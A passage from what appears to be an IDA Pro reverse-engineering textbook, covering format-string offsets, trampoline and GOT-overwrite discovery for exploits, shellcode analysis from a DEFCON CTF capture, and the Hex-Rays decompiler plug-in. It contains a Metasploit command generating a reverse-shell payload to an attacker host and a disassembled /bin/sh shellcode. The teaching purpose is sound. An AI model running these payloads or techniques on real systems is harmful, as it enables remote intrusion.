   −00000121                 db ? ; undefined
   −00000120                 db ? ; undefined
   −0000011F                 db ? ; undefined
   −0000011E                 db ? ; undefined
   −0000011D                 db ? ; undefined
   −0000011C                 db ? ; undefined
   −0000011B                 db ? ; undefined
   −0000011A                 db ? ; undefined
   −00000119                 db ? ; undefined
   −00000118 s1              dd ?                    ; offset
   −00000114 stream          dd ?                    ; offset
   −00000110 format          db 264 dup(?)</pre></div></div><p>The 16 undefined bytes spanning frame offsets <code class="literal">128h</code> through <code class="literal">119h</code> represent the block of memory that the compiler (gcc in this case) has preallocated for the arguments passed in to the functions that will be called by the vulnerable function. The <code class="literal">stream</code> argument to <code class="literal">fprintf</code> will be placed at the top of the stack <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e39670"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span>, while the format string pointer will be placed immediately below <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e39677"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> the <code class="literal">stream</code> argument.</p><p>In format string exploits, an attacker is often interested in the distance from the format string pointer to the beginning of the buffer holding the attacker’s input. In the preceding stack frame, 16 bytes separate the format string argument from the actual format string buffer. To further the discussion, we will assume that an attacker has entered the following format string.</p><a id="I_programlisting3_d1e39688"/><pre class="programlisting">"%x %x %x %x %x"</pre><p>Here, <code class="literal">fprintf</code> would expect five arguments immediately following the format string argument. The first four of these arguments would occupy the space between the format string argument and the format string buffer. The fifth, and final, of these arguments would overlap the first four bytes of the format string buffer itself. Readers familiar with format string exploits<sup>[<a class="footnote" href="#ftn.CHP-22-FN-11" id="CHP-22-FN-11">196</a>]</sup> will know that arguments within a format string may be named explicitly by index number. The following format string demonstrates accessing the fifth argument following the format string in order to format it as a hexadecimal value.<a class="indexterm" id="IDX-CHP-22-0077"/><a class="indexterm" id="IDX-CHP-22-0078"/><a class="indexterm" id="IDX-CHP-22-0079"/><a class="indexterm" id="IDX-CHP-22-0080"/><a class="indexterm" id="IDX-CHP-22-0081"/><a class="indexterm" id="IDX-CHP-22-0082"/><a class="indexterm" id="IDX-CHP-22-0083"/><a class="indexterm" id="IDX-CHP-22-0084"/></p><a id="I_programlisting3_d1e39733"/><pre class="programlisting">"%5$x"</pre><p>Continuing with the preceding example, this format string would read the first 4 bytes of the format string buffer as an integer (which we previously noted would occupy the space of the fifth argument to the format string should one have been required), format that integer as a hexadecimal value, and then output the result to the specified file stream. Additional arguments to the format string (the sixth, seventh, and so on) would overlap successive 4-byte blocks within the format string buffer.</p><p>Crafting a format string that will work properly to exploit a vulnerable binary can be tricky and generally relies on precise specification of arguments within the format string. The preceding discussion demonstrates that, in many cases, IDA may be used to quickly and accurately compute required offsets into a format string buffer. By combining this information with information that IDA presents when disassembling various program sections, such as the global offset table (<span class="emphasis"><em>.got</em></span>) or the destructor table (<span class="emphasis"><em>.dtor</em></span>), a correct format string may be derived accurately with no trial and error as might be required when using only a debugger to develop an exploit.<a class="indexterm" id="IDX-CHP-22-0085"/></p></div><div class="sect2" title="Locating Instruction Sequences"><div class="titlepage"><div><div><h2 class="title"><a id="locating_instruction_sequences"/>Locating Instruction Sequences</h2></div></div></div><p>In order to reliably land an exploit, it is often useful to employ a control-transfer mechanism that does not require you to know the exact memory address at which your shellcode resides. This is particularly true when your shellcode lies in the heap or the stack, which may make the address of your shellcode unpredictable. In such cases, it is desirable to find a register that happens to point at your shellcode at the time your exploit is triggered. For example, if the ESI register is known to point at your shellcode at the moment you take control of the instruction pointer, it would be very helpful if the instruction pointer happened to point to a <code class="literal">jmp esi</code> or <code class="literal">call esi</code> instruction, which would vector execution to your shellcode without requiring you to know the exact address of your shellcode. Similarly a <code class="literal">jmp esp</code> is often a very handy way to transfer control to shellcode that you have placed in the stack. This takes advantage of the fact that when a function containing a vulnerable buffer returns, the stack pointer will be left pointing just below the same saved return address that you just overwrote. If you continued to overwrite the stack beyond the saved return address, then the stack pointer is pointing at your data (which should be code!). The combination of a register pointing at your shellcode along with an instruction sequence that redirects execution by jumping to or calling the location pointed to by that register is called a <span class="emphasis"><em>trampoline</em></span>.<a class="indexterm" id="IDX-CHP-22-0086"/><a class="indexterm" id="IDX-CHP-22-0087"/><a class="indexterm" id="IDX-CHP-22-0088"/><a class="indexterm" id="IDX-CHP-22-0089"/><a class="indexterm" id="IDX-CHP-22-0090"/><a class="indexterm" id="IDX-CHP-22-0091"/><a class="indexterm" id="IDX-CHP-22-0092"/><a class="indexterm" id="IDX-CHP-22-0093"/><a class="indexterm" id="IDX-CHP-22-0094"/></p><p>The notion of searching for such instruction sequences is not a new one. In Appendix D of his paper “Variations in Exploit Methods between Linux and Windows,”<sup>[<a class="footnote" href="#ftn.CHP-22-FN-12" id="CHP-22-FN-12">197</a>]</sup> David Litchfield presents a program named <span class="emphasis"><em>getopcode.c</em></span> designed to search for useful instructions in Linux ELF binaries. Along similar lines, the Metasploit<sup>[<a class="footnote" href="#ftn.CHP-22-FN-13" id="CHP-22-FN-13">198</a>]</sup> project offers its <code class="literal">msfpescan</code> tool, which is capable of scanning Windows PE binaries for useful instruction sequences. IDA is just as capable of locating interesting instruction sequences as either of these tools when given the chance.</p><p>For the sake of example, assume that you would like to locate a <code class="literal">jmp esp</code> instruction in a particular x86 binary. You could use IDA’s text-search features to look for the string <code class="literal">jmp esp</code>, which you would only find if you happened to have exactly the right number of spaces between <span class="emphasis"><em>jmp</em></span> and <span class="emphasis"><em>esp</em></span> and which you are unlikely to find in any case because a jump into the stack is seldom used by any compiler. So why bother searching in the first place? The answer lies in the fact that what you are actually interested in is not an occurrence of the disassembled text <code class="literal">jmp esp</code> but rather the byte sequence <code class="literal">FF E4</code>, regardless of its location. For example, the following instruction contains an embedded <code class="literal">jmp esp</code>:</p><a id="I_programlisting3_d1e39837"/><pre class="programlisting">.text:080486CD B8 FF FF E4 34                 mov     eax, 34E4FFFFh</pre><p>Virtual address <code class="literal">080486CFh</code> may be used if a <code class="literal">jmp esp</code> is desired. IDA’s binary search (Search ▸ Sequence of Bytes) capability is the correct way to rapidly locate byte sequences such as these. When performing a binary search for exact matches against a known byte sequence, remember to perform a case-sensitive search, or a byte sequence such as <code class="literal">50 C3</code> (<code class="literal">push eax/ret</code>) will be matched by the byte sequence <code class="literal">70 C3</code> (because 50h is an uppercase <span class="emphasis"><em>P</em></span>, while 70h is a lowercase <span class="emphasis"><em>p</em></span>), which is a jump on overflow with a relative offset of –61 bytes. Binary searches can be scripted using the <code class="literal">FindBinary</code> function, as shown here:<a class="indexterm" id="IDX-CHP-22-0095"/></p><a id="I_programlisting3_d1e39871"/><pre class="programlisting">ea = FindBinary(MinEA(), SEARCH_DOWN | SEARCH_CASE, "FF E4");</pre><p>This function call begins searching down (toward higher addresses) from the lowest virtual address in the database, in a case-sensitive manner, in search of a <code class="literal">jmp esp</code> (<code class="literal">FF E4</code>). If sequence is found, the return value is the virtual address of the start of the byte sequence. If the sequence is not found, the return value is BADADDR (−1). A script that automates searches for a wider variety of instructions is available on the book’s website. Using this script, we might request a search for instructions that transfer control to the location pointed to by the EDX register and receive results similar to the following:<a class="indexterm" id="IDX-CHP-22-0096"/><a class="indexterm" id="IDX-CHP-22-0097"/><a class="indexterm" id="IDX-CHP-22-0098"/><a class="indexterm" id="IDX-CHP-22-0099"/><a class="indexterm" id="IDX-CHP-22-0100"/><a class="indexterm" id="IDX-CHP-22-0101"/></p><a id="I_programlisting3_d1e39905"/><pre class="programlisting">Searching...
Found jmp edx (FF E2) at 0x80816e6
Found call edx (FF D2) at 0x8048138
Found 2 occurrences</pre><p>Convenience scripts such as these can save a substantial amount of time while ensuring that we don’t forget to cover all possible cases as we search for items in a database.</p></div><div class="sect2" title="Finding Useful Virtual Addresses"><div class="titlepage"><div><div><h2 class="title"><a id="finding_useful_virtual_addresses"/>Finding Useful Virtual Addresses</h2></div></div></div><p>The last item we will mention briefly is IDA’s display of virtual addresses in its disassemblies. Situations in which we know that our shellcode is going to end up in a static buffer (in a <code class="literal">.data</code> or <code class="literal">.bss</code> section, for example) are almost always better than situations in which our shellcode lands in the heap or the stack, because we end up with a known, fixed address to which we can transfer control. This usually eliminates the need for NOP slides or the need to find special instruction sequences.<a class="indexterm" id="IDX-CHP-22-0102"/></p><div class="sidebar"><a id="nop_slides"/><p class="title">NOP SLIDES</p><p>A <span class="emphasis"><em>NOP</em></span> slide is a long sequence of consecutive nop (do nothing) instructions that provides a wider target for hitting our shellcode when the address of our shellcode is known to be somewhat variable. Rather than targeting the first useful instruction of our shellcode, we target the middle of the NOP slide. If the NOP slide (and hence the rest of our payload) shifts slightly up or down in memory, we still have a good chance of landing somewhere within the slide and successfully running into our shellcode. For example, if we have room for 500 NOPs as a prefix for our shellcode, we can target the middle of the slide and still hit the slide as long as the address that we guess for the middle of the slide is within 250 bytes of the actual address.</p></div><p>Some exploits take advantage of the fact that attackers are able to write any data they like to any location they choose. In many cases, this may be restricted to a 4-byte overwrite, but this amount often turns out to be sufficient. When a 4-byte overwrite is possible, one alternative is to overwrite a function pointer with the address of our shellcode. The dynamic linking process used in most ELF binaries utilizes a table of function pointers called the <span class="emphasis"><em>global offset table (GOT)</em></span> to store addresses of dynamically linked library functions. When one of these table entries can be overwritten, it is possible to hijack a function call and redirect the call to a location of the attacker’s choosing. A typical sequence of events for an attacker in such cases is to stage shellcode in a known location and then overwrite the GOT entry for the next library function to be called by the exploited program. When the library function is called, control is instead transferred to the attacker’s shellcode.<a class="indexterm" id="IDX-CHP-22-0103"/><a class="indexterm" id="IDX-CHP-22-0104"/><a class="indexterm" id="IDX-CHP-22-0105"/></p><p>The addresses of GOT entries are easily found in IDA by scrolling to the <code class="literal">got</code> section and browsing for the function whose entry you wish to overwrite. In the name of automating as much as possible, though, the following Python script quickly reports the address of the GOT entry that will be used by a given function call:<a class="indexterm" id="IDX-CHP-22-0106"/></p><a id="I_programlisting3_d1e39955"/><pre class="programlisting">ea = ScreenEA()
   dref = ea
   for xref in XrefsFrom(ea, 0):
<img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>     if xref.type == fl_CN and SegName(xref.to) == ".plt":
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>        for dref in DataRefsFrom(xref.to):
            Message("GOT entry for %s is at 0x%08x\n" %
                   (GetFunctionName(xref.to), dref))
            break
   if ea == dref:
      Message("Sorry this does not appear to be a library function call\n")</pre><p>This script is executed by placing the cursor on any call to a library function, such as the following, and invoking the script.</p><a id="I_programlisting3_d1e39971"/><pre class="programlisting">.text:080513A8                 call    _memset</pre><p>The script operates by walking forward through cross-references until the GOT is reached. The first cross-reference that is retrieved <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e39975"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> is tested to ensure that it is a call reference and that it references the ELF procedure linkage table (<code class="literal">.plt</code>). PLT entries contain code that reads a GOT entry and transfers control to the address specified in the GOT entry. The second cross-reference retrieved <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e39984"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> obtains the address of the location being read from the PLT, and this is the address of the associated GOT entry. When executed on the preceding call to <code class="literal">_memset</code>, the output of the script on our example binary yields the following:</p><a id="I_programlisting3_d1e39993"/><pre class="programlisting">GOT entry for .memset is at 0x080618d8</pre><p>This output provides us with exactly the information we require if our intention is to take control of the program by hijacking a call to <code class="literal">memset</code>, namely that we need to overwrite the contents of address <code class="literal">0x080618d8</code> with the address of our shellcode.<a class="indexterm" id="IDX-CHP-22-0107"/></p></div><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-10" id="ftn.CHP-22-FN-10">195</a>] </sup>A <span class="emphasis"><em>write4</em></span> capability presents an attacker with the opportunity to write 4 bytes of his choosing to a memory location of his choosing.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-11" id="ftn.CHP-22-FN-11">196</a>] </sup>Readers wishing to learn more about format string exploits might again refer to Jon Erickson’s <span class="emphasis"><em>Hacking: The Art of Exploitation, 2nd Edition</em></span>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-12" id="ftn.CHP-22-FN-12">197</a>] </sup>See <a class="ulink" href="http://www.nccgroup.com/Libraries/Document_Downloads/Variations_in_Exploit_methods_between_Linux_and_Windows.sflb.ashx">http://www.nccgroup.com/Libraries/Document_Downloads/Variations_in_Exploit_methods_between_Linux_and_Windows.sflb.ashx</a>.</p></div><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-13" id="ftn.CHP-22-FN-13">198</a>] </sup>See <a class="ulink" href="http://www.metasploit.com/">http://www.metasploit.com/</a>.</p></div></div></div>
<div class="sect1" title="Analyzing Shellcode"><div class="titlepage"><div><div><h1 class="title"><a id="analyzing_shellcode"/>Analyzing Shellcode</h1></div></div></div><p>Up to this point, this chapter has focused on the use of IDA as an offensive tool. Before we conclude, it might be nice to offer up at least one use for IDA as a defensive tool. As with any other binary code, there is only one way to determine what shellcode does, and that is to disassemble it. Of course, the first requirement is to get your hands on some shellcode. If you are the curious type and have always wondered how Metasploit payloads work, you might simply use Metasploit to generate a payload in raw form and then disassemble the resulting blob.<a class="indexterm" id="IDX-CHP-22-0108"/><a class="indexterm" id="IDX-CHP-22-0109"/><a class="indexterm" id="IDX-CHP-22-0110"/><a class="indexterm" id="IDX-CHP-22-0111"/><a class="indexterm" id="IDX-CHP-22-0112"/><a class="indexterm" id="IDX-CHP-22-0113"/><a class="indexterm" id="IDX-CHP-22-0114"/><a class="indexterm" id="IDX-CHP-22-0115"/></p><p>The following Metasploit command generates a payload that calls back to port 4444 on the attacker’s computer and grants the attacker a shell on the target Windows computer:</p><a id="I_programlisting3_d1e40039"/><pre class="programlisting"># ./msfpayload windows/shell_reverse_tcp LHOST=192.168.15.20 R &gt;
w32_reverse_4444</pre><p>The resulting file contains the requested payload in its raw binary form. The file can be opened in IDA (in binary form since it has no specific format) and a disassembly obtained by converting the displayed bytes into code.</p><p>Another place that shellcode can turn up is in network packet captures. Narrowing down exactly which packets contain shellcode can be a challenge, and you are invited to check out any of the vast number of books on network security that will be happy to tell you just how to find all those nasty packets. For now consider the reassembled client stream of an attack observed on the Capture the Flag network at DEFCON 18:</p><a id="I_programlisting3_d1e40045"/><pre class="programlisting">00000000   AD 02 0E 08  01 00 00 00  47 43 4E 93  43 4B 91 90  ........GCN.CK..
00000010   92 47 4E 46  96 46 41 4A  43 4F 99 41  40 49 48 43  .GNF.FAJCO.A@IHC
00000020   4A 4E 4B 43  42 49 93 4B  4A 41 47 46  46 46 43 90  JNKCBI.KJAGFFFC.
00000030   4E 46 97 4A  43 90 42 91  46 90 4E 97  42 48 41 48  NF.JC.B.F.N.BHAH
00000040   97 93 48 97  93 42 40 4B  99 4A 6A 02  58 CD 80 09  ..H..B@K.Jj.X...
00000050   D2 75 06 6A  01 58 50 CD  80 33 C0 B4  10 2B E0 31  .u.j.XP..3...+.1
00000060   D2 52 89 E6  52 52 B2 80  52 B2 04 52  56 52 52 66  .R..RR..R..RVRRf
00000070   FF 46 E8 6A  1D 58 CD 80  81 3E 48 41  43 4B 75 EF  .F.j.X...&gt;HACKu.
00000080   5A 5F 6A 02  59 6A 5A 58  99 51 57 51  CD 80 49 79  Z_j.YjZX.QWQ..Iy
00000090   F4 52 68 2F  2F 73 68 68  2F 62 69 6E  89 E3 50 54  .Rh//shh/bin..PT
000000A0   53 53 B0 3B  CD 80 41 41  49 47 41 93  97 97 4B 48  SS.;..AAIGA...KH</pre><p>This dump clearly contains a mix of ASCII and binary data, and based on other data associated with this particular network connection, the binary data is assumed to be shellcode. Packet-analysis tools such as Wireshark<sup>[<a class="footnote" href="#ftn.CHP-22-FN-14" id="CHP-22-FN-14">199</a>]</sup> often possess the capability to extract TCP session content directly to a file. In the case of Wireshark, once you find a TCP session of interest, you can use the <code class="literal">Follow TCP Stream</code> command and then save the raw stream content to a file. The resulting file can then be loaded into IDA (using IDA’s binary loader) and analyzed further. Often network attack sessions contain a mix of shellcode and application layer content. In order to properly disassemble the shellcode, you must correctly locate the first bytes of the attacker’s payload. The level of difficulty in doing this will vary from one attack to the next and one protocol to the next. In some cases, long NOP slides will be obvious (long sequences of <code class="literal">0x90</code> for x86 attacks), while in other cases (such as the current example), locating the NOPs, and therefore the shellcode, may be less obvious. The preceding hex dump, for example, actually contains a NOP slide; however, instead of actual x86 NOPs, a randomly generated sequence of 1-byte instructions that have no effect on the shell code to follow is used. Since an infinite number of permutations exist for such a NOP slide, the danger that a network intrusion detection system will recognize and alert on the NOP slide is diminished. Finally, some knowledge of the application that is being attacked may help in distinguishing data elements meant for consumption by the application from shellcode meant to be executed. In this case, with a little effort, IDA disassembles the preceding binary content as shown here:</p><a id="I_programlisting3_d1e40061"/><pre class="programlisting"><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/>  seg000:00000000           db 0ADh ; ¡
   seg000:00000001           db    2
   seg000:00000002           db  0Eh
   seg000:00000003           db    8
   seg000:00000004           db    1
   seg000:00000005           db    0
   seg000:00000006           db    0
   seg000:00000007           db    0
   seg000:00000008 ; --------------------------------------------------------------
   seg000:00000008           inc     edi
   seg000:00000009           inc     ebx
   seg000:0000000A           dec     esi
   ...             ; NOP slide and shellcode initialization omitted
   seg000:0000006D           push    edx
   seg000:0000006E           push    edx
   seg000:0000006F
   seg000:0000006F loc_6F:                   ; CODE XREF:  seg000:0000007E↓j
   seg000:0000006F           inc     word ptr [esi-18h]
   seg000:00000073           push    1Dh
   seg000:00000075           pop     eax
<img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/>  seg000:00000076           int     80h     ; LINUX - sys_pause
   seg000:00000078           cmp     dword ptr [esi], 4B434148h
   seg000:0000007E           jnz     short loc_6F
   seg000:00000080           pop     edx
   seg000:00000081           pop     edi
   seg000:00000082           push    2
   seg000:00000084           pop     ecx
   seg000:00000085
   seg000:00000085 loc_85:                   ; CODE XREF:  seg000:0000008F↓j
   seg000:00000085           push    5Ah ; 'Z'
   seg000:00000087           pop     eax
   seg000:00000088           cdq
   seg000:00000089           push    ecx
   seg000:0000008A           push    edi
   seg000:0000008B           push    ecx
<img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/>  seg000:0000008C           int     80h     ; LINUX - old_mmap
   seg000:0000008E           dec     ecx
   seg000:0000008F           jns     short loc_85
   seg000:00000091           push    edx
   seg000:00000092           push    'hs//'
   seg000:00000097           push    'nib/'
   ...             ; continues to invoke execve to spawn the shell</pre><p>One point worth noting is that the first 8 bytes of the stream <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e40082"/><img alt="" src="httpatomoreillycomsourcenostarchimages854061.png"/></span> are actually protocol data, not shellcode, and thus we have chosen not to disassemble them. Also, IDA seems to have misidentified the system calls that are being made at <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e40088"/><img alt="" src="httpatomoreillycomsourcenostarchimages854063.png"/></span> and <span class="inlinemediaobject"><a id="I_inlinemediaobject3_d1e40094"/><img alt="" src="httpatomoreillycomsourcenostarchimages854093.png"/></span>. We have omitted the fact that this exploit was targeting a FreeBSD application, which would be helpful in decoding the system call numbers being used in the payload. Because IDA is only capable of annotating Linux system call numbers, we are left to do a little research to learn that FreeBSD system call <code class="literal">29</code> (<code class="literal">1dh</code>) is actually <code class="literal">recvfrom</code> (rather than <code class="literal">pause</code>) and system call <code class="literal">90</code> (<code class="literal">5Ah</code>) is actually the <code class="literal">dup2</code> function (rather than <code class="literal">old_mmap</code>).<a class="indexterm" id="IDX-CHP-22-0116"/><a class="indexterm" id="IDX-CHP-22-0117"/><a class="indexterm" id="IDX-CHP-22-0118"/></p><p>Because it lacks any header information useful to IDA, shellcode will generally require extra attention in order to be properly disassembled. In addition, shellcode encoders are frequently employed as a means of evading intrusion detection systems. Such encoders have an effect very much like the effect that obfuscation tools have on standard binaries, further complicating the shellcode-disassembly process.</p><div class="footnotes"><br/><hr/><div class="footnote"><p><sup>[<a class="para" href="#CHP-22-FN-14" id="ftn.CHP-22-FN-14">199</a>] </sup>See <a class="ulink" href="http://www.wireshark.org/">http://www.wireshark.org/</a>.</p></div></div></div>
<div class="sect1" title="Summary"><div class="titlepage"><div><div><h1 class="title"><a id="summary-id21"/>Summary</h1></div></div></div><p>Keep in mind that IDA is not a silver bullet you can use to make vulnerabilities pop out of binaries. If your ultimate goal is to perform vulnerability analysis using only IDA, then you would be wise to automate your efforts to the maximum extent possible. As you develop algorithms for analyzing binaries, you should always consider how you might automate those algorithms in order to save time on future analysis tasks. Finally, it is important to understand that no amount of reading through the best books available can make you proficient at vulnerability analysis and exploit development. If you are interested in developing your skills, you must practice. A large number of sites offer practice challenges for just this purpose; an excellent starting point is the Wargames section at <a class="ulink" href="http://www.overthewire.org/wargames/">http://www.overthewire.org/wargames/</a>.</p></div>
<div class="chapter" title="Chapter&#xA0;23.&#xA0;Real-World IDA Plug-ins"><div class="titlepage"><div><div><h1 class="title"><a id="real-world_ida_plug-ins"/>Chapter 23. Real-World IDA Plug-ins</h1></div></div></div><div class="informalfigure"><a id="image_no_caption-id22"/><div class="mediaobject"><a id="I_mediaobject4_d1e40148"/><img alt="image with no caption" src="httpatomoreillycomsourcenostarchimages854059.png.jpg"/></div></div><p>Given the variety of uses that IDA has been put to over the years, it should not be surprising that a large number of plug-ins have been developed to add capabilities that people have found useful in their particular applications of IDA. If you decide that you would like to take advantage of other people’s work, know that there is no one-stop shop for publicly available plug-ins. The three principal locations where you may find references to plug-ins are the Hex-Rays download page,<sup>[<a class="footnote" href="#ftn.CHP-23-FN-1" id="CHP-23-FN-1">200</a>]</sup> the OpenRCE downloads page,<sup>[<a class="footnote" href="#ftn.CHP-23-FN-2" id="CHP-23-FN-2">201</a>]</sup> and the RCE reverse engineering forums.<sup>[<a class="footnote" href="#ftn.CHP-23-FN-3" id="CHP-23-FN-3">202</a>]</sup> Of course, spending a little time with Google doesn’t hurt either.<a class="indexterm" id="IDX-CHP-23-0001"/><a class="indexterm" id="IDX-CHP-23-0002"/><a class="indexterm" id="IDX-CHP-23-0003"/><a class="indexterm" id="IDX-CHP-23-0004"/><a class="indexterm" id="IDX-CHP-23-0005"/></p><p>As with any other piece of publicly available software, you may face some challenges while attempting to install third-party plug-ins. In cases where plug-in developers have elected to publish their efforts, plug-ins are distributed in the form of source code, a compiled binary, or both. If forced to build from source, you must deal with the make files (or equivalents) supplied by the plug-in’s author, which may or may not work with your particular compiler configuration. On the other hand, if a plug-in is distributed in binary form, it may have been built with a version of the SDK that is incompatible with your version of IDA, which means you will not be able to run the plug-in at all until the author elects to release an updated version. Finally, the plug-in may have external dependencies that must be satisfied in order to build it, run it, or both.<a class="indexterm" id="IDX-CHP-23-0006"/><a class="indexterm" id="IDX-CHP-23-0007"/><a class="indexterm" id="IDX-CHP-23-0008"/><a class="indexterm" id="IDX-CHP-23-0009"/><a class="indexterm" id="IDX-CHP-23-0010"/><a class="indexterm" id="IDX-CHP-23-0011"/><a class="indexterm" id="IDX-CHP-23-0012"/></p><p>In this chapter we will review several popular IDA plug-ins; their purpose; where to obtain them; and how to build, install, and use them.<a class="indexterm" id="IDX-CHP-23-0013"/><a class="indexterm" id="IDX-CHP-23-0014"/></p><div class="sect1" title="Hex-Rays"><div class="titlepage"><div><div><h1 class="title"><a id="hex-rays"/>Hex-Rays</h1></div></div></div><p>Perhaps the granddaddy of all IDA plug-ins, Hex-Rays is a decompiler plug-in capable of generating “C-like pseudocode”<sup>[<a class="footnote" href="#ftn.CHP-23-FN-4" id="CHP-23-FN-4">203</a>]</sup> for functions in compiled ARM or 32-bit x86 binaries. Hex-Rays is a commercial plug-in created and sold by the same company that produces IDA. The decompiler is available for all 32-bit versions of IDA. Hex-Rays is shipped in binary form only, and installation is performed by copying the supplied plug-in into <span class="emphasis"><em>&lt;IDADIR&gt;/plugins</em></span>. A manual for using Hex-Rays is available online<sup>[<a class="footnote" href="#ftn.CHP-23-FN-5" id="CHP-23-FN-5">204</a>]</sup> that provides a nice overview of using Hex-Rays and that contains some documentation for the Hex-Rays SDK<sup>[<a class="footnote" href="#ftn.CHP-23-FN-6" id="CHP-23-FN-6">205</a>]</sup> used to create decompiler plug-ins.<a class="indexterm" id="IDX-CHP-23-0015"/></p><p>Once installed, the decompiler is activated via View ▸ Open Subviews ▸ Pseudocode (hotkey F5) to decompile the function containing the cursor or via File ▸ Produce File ▸ Create C File (hotkey <span class="keycap">ctrl</span>-F5) to decompile all functions in the database and save them to a file.</p><p>When you generate pseudocode for a single function, a new subview (tabbed window) containing the decompiled function opens in the IDA display. <a class="xref" href="ch23.html#example_hex-rays_output" title="Example 23-1. Example Hex-Rays output">Example 23-1</a> shows an example of pseudocode generated using Hex-Rays to examine a Defcon 15 Capture the Flag binary. Each time you generate pseudocode for a function, Hex-Rays opens a new tabbed window to display the result.</p><div class="example"><a id="example_hex-rays_output"/><p class="title">Example 23-1. Example Hex-Rays output</p><div class="example-contents"><pre class="programlisting">signed int __cdecl sub_80489B4(int fd)
{
  int v1; // eax@1
  signed int v2; // edx@1
  char buf; // [sp+4h] [bp-208h]@2
  char s; // [sp+104h] [bp-108h]@2

  v1 = sub_8048B44(fd, (int)"Hans Brix? Oh no! Oh,
 herro. Great to see you again, Hans! ", 0);
  v2 = −1;
  if ( v1 != −1 )
  {
    recv(fd, &amp;buf, 0x100u, 0);
    snprintf(&amp;s, 0x12Cu, "Hans Brix says: \"%s\"\n", &amp;buf);
    sub_8048B44(fd, (int)&amp;s, 0);
    v2 = 0;
  }
  return v2;
}</pre></div></div><p>Note that while Hex-Rays uses a slightly different dummy-naming convention for arguments (<code class="literal">a1</code>, <code class="literal">a2</code>, etc.) and local variables (<code class="literal">v1</code>, <code class="literal">v2</code>) than is used in IDA, the ability to distinguish between function parameters and local variables remains. If you have changed the names of any variables within the disassembly, the decompiler will make use of those names rather than internally generated dummy names.<a class="indexterm" id="IDX-CHP-23-0016"/><a class="indexterm" id="IDX-CHP-23-0017"/><a class="indexterm" id="IDX-CHP-23-0018"/><a class="indexterm" id="IDX-CHP-23-0019"/></p><div class="informaltable"><table style="border-collapse: collapse;border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col/><col/></colgroup><tbody><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Name</strong></span></p></td><td style="text-align: left" valign="top"><p>Hex-Rays Decompiler</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Author</strong></span></p></td><td style="text-align: left" valign="top"><p>Ilfak Guilfanov, <a class="ulink" href="http://hex-rays.com">Hex-Rays.com</a></p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Distribution</strong></span></p></td><td style="text-align: left" valign="top"><p>Binary only</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Price</strong></span></p></td><td style="text-align: left" valign="top"><p>US$2,239</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Description</strong></span></p></td><td style="text-align: left" valign="top"><p>Generates C-like pseudocode from compiled ARM or 32-bit, x86 functions</p></td></tr><tr><td style="text-align: left" valign="top"><p><span class="strong"><strong>Information</strong></span></p></td><td style="text-align: left" valign="top"><p><a class="ulink" href="http://www.hex-rays.com/decompiler.shtml">http://www.hex-rays.com/decompiler.shtml</a></p></td></tr></tbody></table></div><p>Hex-Rays utilizes the same cues employed by IDA to deduce datatypes; however, you will probably notice some type casting taking place in order to coerce type conversions where the types used in an operation do not appear to match Hex-Rays’s expectations. As a convenience, you may tell Hex-Rays to hide all casts by right-clicking and choosing the Hide Casts menu option.</p><p>Once a pseudocode window has been opened, you may use it almost like a source code editor and navigator. Navigating and editing within a pseudo-code window are much like navigating and editing within a standard IDA disassembly window. Double-clicking a function name, for example, immediately causes the selected function to be decompiled within the pseudocode window. Many editing features are available via context-sensitive menus, as shown in <a class="xref" href="ch23.html#hex-rays_decompiler_editing_options" title="Figure 23-1. Hex-Rays decompiler editing options">Figure 23-1</a>, including the ability to change variable and function names and types.<a class="indexterm" id="IDX-CHP-23-0020"/><a class="indexterm" id="IDX-CHP-23-0021"/></p><div class="figure"><a id="hex-rays_decompiler_editing_options"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject4_d1e40374"/><img alt="Hex-Rays decompiler editing options" src="httpatomoreillycomsourcenostarchimages854344.png"/></div></div><p class="title">Figure 23-1. Hex-Rays decompiler editing options</p></div><p>Further, changes that you make to variable names, function names, and datatypes are propagated back to IDA’s disassembly windows. Through repeated application of Rename and Set Type, and by hiding casts, <a class="xref" href="ch23.html#example_hex-rays_output" title="Example 23-1. Example Hex-Rays output">Example 23-1</a> is easily transformed into the following.<a class="indexterm" id="IDX-CHP-23-0022"/><a class="indexterm" id="IDX-CHP-23-0023"/><a class="indexterm" id="IDX-CHP-23-0024"/></p><a id="I_programlisting4_d1e40393"/><pre class="programlisting">signed int __cdecl sub_80489B4(int fd)
{
  int length; // eax@1
  signed int error; // edx@1
  char buf[256]; // [sp+4h] [bp-208h]@2
  char s[264]; // [sp+104h] [bp-108h]@2

  length = write_string(fd, "Hans Brix? Oh no! Oh, herro.
 Great to see you again, Hans! ", 0);
  error = −1;
  if ( length != −1 )
  {
    recv(fd, buf, 256u, 0);
    snprintf(s, 300u, "Hans Brix says: \"%s\"\n", buf);
    write_string(fd, s, 0);
    error = 0;
  }
  return error;
